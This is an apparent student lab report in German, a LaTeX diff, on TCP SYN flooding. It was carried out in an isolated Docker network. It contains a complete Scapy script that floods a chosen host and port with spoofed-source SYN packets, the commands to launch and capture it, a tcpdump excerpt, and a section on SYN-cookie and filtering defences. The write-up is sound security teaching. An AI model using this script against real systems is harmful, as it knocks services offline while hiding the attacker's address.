@@ -1,0 +1,177 @@
+\documentclass[
+	fontsize=12pt,
+	paper=a4,
+	numbers=noenddot,
+	listof=totoc,
+	listof=entryprefix,
+	listof=nochaptergap,
+	bibliography=totoc,
+	parskip=half,
+	openany
+]{scrbook}
+
+\include{../../for_latex/preamble}
+
+\lstset{
+	extendedchars=true,
+	inputencoding=utf8,
+	literate=
+		{ä}{{\"a}}1
+		{ö}{{\"o}}1
+		{ü}{{\"u}}1
+		{ß}{{\ss}}1
+		{Ä}{{\"A}}1
+		{Ö}{{\"O}}1
+		{Ü}{{\"U}}1
+}
+
+\begin{document}
+
+\begin{titlepage}
+	\pagestyle{empty}
+
+	\begin{flushright}
+		\begin{figure}[ht]
+			\flushright
+			\includegraphics[height=2cm]{../../for_latex/hfu}
+		\end{figure}
+	\end{flushright}
+
+	\begin{center}
+		\vspace{3cm}
+
+		{\fontsize{22}{22} \selectfont \textbf{Blatt 1}}\\[5mm]
+		{\fontsize{18}{18} \selectfont Web-Security und Intrusion Prevention}
+
+		\vspace{12cm}
+
+		{\fontsize{14}{14} \selectfont Luis Staudt}
+	\end{center}
+\end{titlepage}
+
+
+\chapter*{Aufgabe 1: TCP-SYN-Flooding}
+
+\section*{Aufbau des Versuchs}
+
+Der Angriff wurde in einer vollständig isolierten Umgebung gegen einen eigenen
+Testserver durchgeführt, nicht gegen fremde Systeme. Anstelle zweier virtueller
+Maschinen kamen zwei Container in einem \texttt{internal}-Docker-Netz zum
+Einsatz, das keine Verbindung nach aussen besitzt. Als Opfer diente ein
+minimaler Webserver (\texttt{python -m http.server 80}), der die vorgegebene
+\texttt{index.html} ausliefert. Der Angreifer lief in einem Container mit Scapy
+und tcpdump. Die \texttt{NET\_RAW}-Capability ist dabei erforderlich, da das
+Versenden roher Pakete Root-Rechte auf Socket-Ebene voraussetzt.
+
+Vor dem Angriff werden auf dem Opfer die SYN-Cookies deaktiviert, da der Kernel
+die halboffenen Verbindungen andernfalls nicht in einer begrenzten Queue
+vorhält:
+
+\begin{lstlisting}[language=bash]
+sudo sysctl -w net.ipv4.tcp_syncookies=0
+\end{lstlisting}
+
+\section*{Funktionsweise des Angriffs}
+
+Der TCP-Verbindungsaufbau ist ein Drei-Wege-Handshake. Der Client sendet
+\texttt{SYN}, der Server antwortet mit \texttt{SYN/ACK} und legt die halboffene
+Verbindung in seiner Backlog-Queue ab, der Client bestätigt mit \texttt{ACK}.
+
+Beim SYN-Flooding sendet der Angreifer sehr viele \texttt{SYN}-Pakete mit
+zufälliger, gefälschter Quell-IP. Der Server antwortet jeweils mit
+\texttt{SYN/ACK} an die gespoofte Adresse und wartet auf das \texttt{ACK}, das
+nie eintrifft. Jede dieser halboffenen Verbindungen belegt bis zum Timeout einen
+Platz in der Backlog-Queue. Ist die Queue voll, lehnt der Server neue und auch
+legitime Verbindungen ab, sodass der Dienst nicht mehr erreichbar ist.
+
+Die zufällige Quell-IP verhindert das Antwort-\texttt{ACK} und verschleiert
+zugleich den Angreifer.
+
+\section*{Das Scapy-Skript}
+
+\begin{lstlisting}[language=Python]
+import argparse, random
+from scapy.all import IP, TCP, send
+
+def random_ip():
+    return ".".join(str(random.randint(1, 254)) for _ in range(4))
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("target")
+    ap.add_argument("-p", "--port", type=int, default=80)
+    ap.add_argument("-c", "--count", type=int, default=1000)
+    args = ap.parse_args()
+    for _ in range(args.count):
+        pkt = IP(src=random_ip(), dst=args.target) / \
+              TCP(sport=random.randint(1024, 65535), dport=args.port, flags="S")
+        send(pkt, verbose=0)
+
+if __name__ == "__main__":
+    main()
+\end{lstlisting}
+
+Das Flag \verb|flags="S"| setzt das SYN-Bit. Die Quelladresse wird über
+\texttt{IP(src=...)} pro Paket gefälscht, der Quell-Port wird zufällig gewählt.
+
+\section*{Durchführung und Mitschnitt}
+
+Der Angriff wurde auf 800 Pakete begrenzt. Diese Anzahl genügt, um das
+Angriffsmuster im Mitschnitt zu belegen, ohne den Dienst tatsächlich
+lahmzulegen. Parallel lief tcpdump und filterte auf SYN-Pakete zum Port 80:
+
+\begin{lstlisting}[language=bash]
+tcpdump -i eth0 -n 'tcp[tcpflags] & tcp-syn != 0 and dst port 80' -w syn.pcap &
+python syn_flood.py 172.20.0.2 -p 80 -c 800
+\end{lstlisting}
+
+Der Mitschnitt belegt den Angriff: eine Folge von \texttt{SYN}-Paketen
+(\texttt{Flags [S]}) von ständig wechselnden, gefälschten Quell-IPs an das Opfer
+\texttt{172.20.0.2:80}.
+
+\begin{lstlisting}[language=bash]
+09:55:10.545916 IP 156.31.193.62.22665  > 172.20.0.2.80: Flags [S], seq 0
+09:55:10.571039 IP 55.1.180.13.25662    > 172.20.0.2.80: Flags [S], seq 0
+09:55:10.583164 IP 211.182.186.75.40134 > 172.20.0.2.80: Flags [S], seq 0
+09:55:10.595030 IP 113.37.126.215.22853 > 172.20.0.2.80: Flags [S], seq 0
+09:55:10.607081 IP 9.41.98.78.19871     > 172.20.0.2.80: Flags [S], seq 0
+09:55:10.619006 IP 207.91.156.32.34708  > 172.20.0.2.80: Flags [S], seq 0
+09:55:10.636367 IP 160.81.235.108.43512 > 172.20.0.2.80: Flags [S], seq 0
+09:55:10.655004 IP 253.203.93.254.21877 > 172.20.0.2.80: Flags [S], seq 0
+\end{lstlisting}
+
+Der vollständige Mitschnitt liegt als \texttt{images/syn\_flood.pcap} bei und
+lässt sich in Wireshark öffnen. Als Anzeigefilter dient dort
+\texttt{tcp.flags.syn == 1 \&\& tcp.flags.ack == 0}, der genau die
+Angriffspakete markiert.
+
+\section*{Verteidigung: SYN-Cookies}
+
+Die wirksamste Gegenmassnahme sind SYN-Cookies, die auf aktuellen Linux-Systemen
+standardmässig aktiv sind:
+
+\begin{lstlisting}[language=bash]
+sudo sysctl -w net.ipv4.tcp_syncookies=1
+\end{lstlisting}
+
+Der Server legt beim Eingang eines \texttt{SYN} keinen Zustand mehr in der
+Backlog-Queue an. Stattdessen kodiert er die nötigen Informationen
+kryptografisch in die Initial Sequence Number des \texttt{SYN/ACK}, das
+sogenannte Cookie. Die Verbindung wird erst aufgebaut, sobald ein gültiges
+\texttt{ACK} mit passendem Cookie zurückkommt. Da ohne Zustand keine Queue
+volllaufen kann, läuft der SYN-Flood ins Leere.
+
+Weitere Massnahmen ergänzen diesen Schutz:
+
+\begin{itemize}
+	\item Rate-Limiting pro Quell-IP, das bei gespooften Adressen allerdings nur
+	      begrenzt greift.
+	\item Vergrössern der Backlog-Queue und Verkürzen des Timeouts für
+	      halboffene Verbindungen.
+	\item Firewalls und Upstream-Filter beim Provider.
+	\item Ingress-Filtering (BCP\,38), das gespoofte Quell-IPs am Netzrand
+	      verwirft.
+\end{itemize}
+
+
+\end{document}
